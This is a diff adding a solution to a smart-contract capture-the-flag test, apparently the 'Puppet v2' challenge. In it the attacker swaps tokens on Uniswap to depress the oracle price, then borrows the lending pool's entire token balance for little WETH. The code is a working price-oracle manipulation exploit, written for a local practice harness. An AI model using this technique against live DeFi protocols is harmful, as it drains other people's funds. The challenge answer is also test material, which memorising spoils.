@@ -82,6 +82,36 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        //Create attacker token and router instances 
+        let attackerRouterInstance = await this.uniswapRouter.connect(attacker)
+        let attackerTokenInstance = await this.token.connect(attacker)
+
+        //approve tokens and swap for eth
+        await attackerTokenInstance.approve(attackerRouterInstance.address, ATTACKER_INITIAL_TOKEN_BALANCE)
+        await attackerRouterInstance.swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE, 
+            0, 
+            [this.token.address, this.weth.address],
+            attacker.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+            {gasLimit: 1e6}
+        )
+
+        //Check how much I need to borrow to drain the lending pool and calculate the amount of weth needed
+        let tokenToBorrow = await this.token.balanceOf(this.lendingPool.address)
+        let ETHRequiredToborrowAllTokens = await this.lendingPool.calculateDepositOfWETHRequired(tokenToBorrow)
+
+        //deposit the correct amount of ETH to receive WETH
+        let attackerWETH = await this.weth.connect(attacker)
+        await attackerWETH.deposit({value: ETHRequiredToborrowAllTokens})
+
+        //approve and borrow from lending pool
+        await attackerWETH.approve(this.lendingPool.address, ETHRequiredToborrowAllTokens)
+        let attackerLendingPoolInstance = await this.lendingPool.connect(attacker)
+        await attackerLendingPoolInstance.borrow(tokenToBorrow)
+
+        //NOTE as POOL initially had 1000000, I pass the last assertion because pool balance is only 10100 after
+        //my price manipulation swap
     });
 
     after(async function () {
